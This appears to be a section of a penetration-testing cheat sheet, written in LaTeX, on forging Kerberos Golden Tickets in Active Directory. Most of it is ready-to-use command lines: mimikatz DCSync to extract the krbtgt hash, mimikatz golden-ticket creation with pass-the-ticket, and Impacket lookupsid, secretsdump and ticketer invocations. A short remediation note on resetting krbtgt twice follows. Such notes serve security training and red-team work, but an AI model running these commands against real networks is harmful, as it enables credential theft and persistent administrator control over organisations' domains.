\subsection{Golden Ticket Attack}
\label{kerberos:golden-ticket}

A \href{https://attack.mitre.org/techniques/T1558/001/}{golden  ticket} is a TGT  forged  by Kerberos key distribution center. You can create  usable Kerberos tickets for accounts that do not exist in the Active  Directory. 

Requierement:
\begin{itemize}
    \item Domain Name
    \item Domain SID
    \item username to Impersonate and its RID
    \item KRBTGT's hash
\end{itemize}

\subsubsection{On Windows}

\begin{verbatim}
> Import-Module .\PowerView.ps1
> Get-DomainSID

mimikatz # lsadump::dcsync /user:krbtgt /domain:<domain_fqdn>


kerberos::golden/user:<user|administrator> /id:<user_rid|500> /group:500,,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<domain_sid> /domain:<domain_FQDN> /ptt [/ticket:c:\temp\trust.kirbi]

or


klist
\end{verbatim}

\subsubsection{From Linux}

\begin{verbatim}


# echo '10.129.205.35 <dc_fqdn> <domain_fqdn>' | sudo \
    tee -a /etc/hosts

lookupsid.py  -domain-sids '<user_domain_fqdn>/<user>:<password>'@<target_domain_fqdn>

secretsdump.py \
    -just-dc-user <domain>/<name|krbtgt> \
    '<domain>/<user>:<password>'@<dc_fqdn>

ticketer.py \
    -nthash <krbtgt_hash> \
    -domain <domain_FQDN> \
    -domain-sid <domain_sid> \
    -user-id <user_rid|500> \
    <user|administrator>

$ export KRB5CCNAME=./Administrator.ccache
\end{verbatim}

\subsubsection{Remediation}

To obtain a Golden ticket, an attacker needs  domain/local administrator access on Active Directory forest or domain â€“  and once the ticket is created, it is good for 10 years by default!

If  you believe that someone created an unauthorized golden ticket, you  would need to reset the Kerberos service account, krbtgt. While this  isn't difficult, there are several critical steps to the process. 

Because  Active Directory stores the old and current passwords for all accounts,  you must reset the krbtgt account twice. But the second reset should  occur only after waiting the maximum user ticket lifetime after the first password reset. Microsoft provides a handy script to assist with this here.





\subsubsection{links}
\begin{itemize}
    \item 
        \url{https://en.hackndo.com/kerberos-silver-golden-tickets/}
    \item
        \url{https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/}
\end{itemize}
